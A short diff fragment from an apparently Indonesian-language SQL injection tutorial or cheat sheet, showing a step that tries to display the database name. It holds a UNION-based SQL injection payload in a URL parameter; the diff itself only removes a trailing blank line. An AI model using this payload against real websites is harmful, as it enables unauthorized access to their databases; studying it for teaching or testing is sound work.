@@ -20,4 +20,3 @@ Coba untuk menampilkan nama database
 ```
 ?param=-1' union select 1,database(),3--+-
 ```
-
